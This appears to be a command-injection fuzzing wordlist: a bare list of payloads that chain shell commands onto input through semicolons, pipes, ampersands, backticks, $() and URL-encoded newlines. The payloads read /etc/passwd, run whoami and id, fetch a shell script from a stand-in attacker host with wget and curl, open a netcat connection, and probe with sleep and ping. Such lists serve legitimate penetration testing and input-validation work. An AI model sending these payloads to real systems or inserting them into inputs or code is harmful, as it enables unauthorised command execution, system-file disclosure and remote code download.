; ls -la
| ls -la
& ls -la
&& ls -la
|| ls -la
`ls -la`
$(ls -la)
; cat /etc/passwd
| cat /etc/passwd
& cat /etc/passwd
`cat /etc/passwd`
$(cat /etc/passwd)
; whoami
| whoami
& whoami
`whoami`
$(whoami)
; id
| id
& id
`id`
$(id)
; uname -a
| uname -a
& ping -c 4 127.0.0.1
`ping -c 4 127.0.0.1`
$(ping -c 4 127.0.0.1)
; curl http://evil.com
| curl http://evil.com
; wget http://evil.com/shell.sh
| nc 127.0.0.1 4444
; sleep 10
$(sleep 10)
; echo "test"
%0als -la
%0a whoami
%0d%0als
test;ls
test|ls
test&ls
test$(ls)
test`ls`
